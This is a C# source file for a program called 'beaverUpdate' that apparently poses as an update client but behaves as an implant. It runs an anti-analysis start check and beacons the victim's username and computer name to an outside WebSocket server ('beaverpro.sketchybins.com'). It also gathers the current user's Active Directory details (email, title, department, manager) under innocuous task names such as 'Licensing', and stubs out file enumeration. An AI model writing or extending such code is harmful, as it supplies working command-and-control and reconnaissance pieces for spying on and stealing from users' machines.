using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.WebSockets;
using VoidSerpent;
using System.Runtime.CompilerServices;

namespace beaverUpdate
{
    internal class Program
    {
        private static DatabaseManager db;

        static async Task Main(string[] args)
        {
            // protected start: one instance, specific parents
            if (!BetrayalIsASymptom.protectedStart())
            {
                Console.WriteLine("Unable to run due to security measures.");
                return;
            }

            // Ensure we're tracking state
            db = new DatabaseManager("syncstate.db");

            // Connect to the "update" server
            ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();
            var client = $"{hostInfo.UserName}@{hostInfo.ComputerName}";
            var socketTask = Task.Run(() => CommSDK.ListenToWebSocketAsync($"ws://beaverpro.sketchybins.com:8080/checkupdate?client={client}"));
            

            // Start the task flow
            List<string> userJobDone = new List<string>
            {
                "collected",
                "completed",
                "failed"
            };

            List<string> tasks = new List<string>
            {
                "Licensing", // enumerate local and AD info
                "Paperwork", // enumerate files
            };

            // Run through the tasks
            foreach (var task in tasks)
            {
                Console.WriteLine($"{task}");
                try // task has been run
                {
                    string taskStatus = db.GetJobStatus(task);
                    Console.WriteLine(taskStatus);
                    if (!userJobDone.Contains(taskStatus)) //task not completed
                    {
                        doTask(task);
                    }
                } catch // task not previously run
                {
                    doTask(task);
                }
            }

            // wait for messages
            await socketTask;
        }

        // Task functions
        static void doTask(string taskName)
        {
            switch(taskName)
            {
                case "Licensing":
                    try
                    {
                        // Get the current user's active directory info, store to local db, record task
                        DirectoryHelper.UserInfo userInfo = DirectoryHelper.GetUserInfo();
                        db.DirectoryEntry(userInfo.UserName, userInfo.Name, userInfo.Email, userInfo.Title, userInfo.Department, userInfo.Manager);
                        db.JobEntry(name: "Licensing", status: "collected");
                    }
                    catch
                    {
                        Console.WriteLine("Marking task failed");
                        db.JobEntry(name: "Licensing", status: "failed");
                    }
                    break;
                case "Paperwork":
                    Console.WriteLine("scanning files");
                    break;
            }
        }
    }    
}
